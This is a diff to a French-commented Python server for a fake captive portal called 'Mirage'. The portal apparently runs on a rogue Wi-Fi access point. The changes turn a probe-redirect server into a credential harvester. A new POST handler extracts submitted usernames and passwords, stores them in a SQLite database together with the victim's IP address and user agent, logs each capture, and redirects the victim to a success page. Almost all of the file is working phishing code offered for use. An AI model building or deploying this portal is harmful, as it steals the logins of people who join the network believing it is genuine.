@@ -1,21 +1,58 @@
 #!/usr/bin/env python3
-# Serveur du portail Mirage.
-# Role : declencher la detection de portail captif des appareils (pour afficher
-# "se connecter au reseau") et servir les fichiers du dossier du portail.
-# La page du portail et la reception de la saisie ne sont PAS ici : depose ton
-# projet de portail dans PORTAIL (index.html + assets).
-import http.server, socketserver, os
+# Serveur du portail Mirage avec stockage des credentials.
+import http.server
+import socketserver
+import os
+import sqlite3
+import urllib.parse
+import json
+from datetime import datetime
 
 PORTAIL = "/opt/fennec-mirage/portal"
 BIND = "10.0.0.1"
 PORT = 80
+DB_PATH = "/opt/fennec-mirage/credentials.db"
 
 # Sondes de detection de portail captif des OS courants.
 SONDES = {
     "/generate_204", "/gen_204", "/ncsi.txt", "/connecttest.txt",
     "/hotspot-detect.html", "/library/test/success.html",
-    "/redirect", "/canonical.html", "/success.txt",
+    "/redirect", "/canonical.html", "/success.txt"
 }
+
+def init_db():
+    """Initialise la base de donnees SQLite."""
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS credentials (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            timestamp TEXT,
+            username TEXT,
+            password TEXT,
+            user_agent TEXT,
+            ip_address TEXT,
+            portal_page TEXT
+        )
+    ''')
+    conn.commit()
+    conn.close()
+
+def save_credentials(username, password, user_agent, ip_address, portal_page):
+    """Sauvegarde les credentials dans la base."""
+    try:
+        conn = sqlite3.connect(DB_PATH)
+        cursor = conn.cursor()
+        cursor.execute('''
+            INSERT INTO credentials (timestamp, username, password, user_agent, ip_address, portal_page)
+            VALUES (?, ?, ?, ?, ?, ?)
+        ''', (datetime.now().isoformat(), username, password, user_agent, ip_address, portal_page))
+        conn.commit()
+        conn.close()
+        return True
+    except Exception as e:
+        print(f"Error saving credentials: {e}")
+        return False
 
 class H(http.server.SimpleHTTPRequestHandler):
     def __init__(self, *a, **k):
@@ -26,19 +63,50 @@ class H(http.server.SimpleHTTPRequestHandler):
 
     def do_GET(self):
         path = self.path.split("?")[0]
-        # Une sonde de detection -> on renvoie vers la page du portail, ce qui
-        # fait apparaitre l'ecran "se connecter au reseau" sur l'appareil.
+        # Une sonde de detection -> redirection vers le portail
         if path in SONDES:
             self.send_response(302)
             self.send_header("Location", f"http://{BIND}/")
             self.end_headers()
             return
-        # Sinon on sert le fichier demande, avec repli sur index.html.
+        # Sinon on sert le fichier demande
         local = os.path.join(PORTAIL, path.lstrip("/"))
         if not os.path.isfile(local):
             self.path = "/index.html"
-        return super().do_GET()
+        super().do_GET()
+
+    def do_POST(self):
+        """Gere la soumission du formulaire de connexion."""
+        content_length = int(self.headers.get('Content-Length', 0))
+        post_data = self.rfile.read(content_length).decode('utf-8')
+
+        # Parse les donnees du formulaire
+        params = urllib.parse.parse_qs(post_data)
+
+        # Extrait username et password (adapte les noms a ton formulaire)
+        username = params.get('username', [''])[0]
+        password = params.get('password', [''])[0]
+
+        # Informations supplementaires
+        user_agent = self.headers.get('User-Agent', '')
+        ip_address = self.client_address[0]
+        portal_page = self.path
+
+        # Sauvegarde dans la base
+        if username or password:
+            save_credentials(username, password, user_agent, ip_address, portal_page)
+            print(f"[MIRAGE] Credentials captured: {username}")
+
+        # Redirige vers une page de succes (ou garde l'utilisateur sur le portail)
+        self.send_response(302)
+        self.send_header("Location", f"http://{BIND}/success.html")
+        self.end_headers()
+
+# Initialise la base de donnees au demarrage
+init_db()
 
 socketserver.TCPServer.allow_reuse_address = True
 with socketserver.TCPServer((BIND, PORT), H) as httpd:
+    print(f"[MIRAGE] Portal server running on {BIND}:{PORT}")
+    print(f"[MIRAGE] Database: {DB_PATH}")
     httpd.serve_forever()
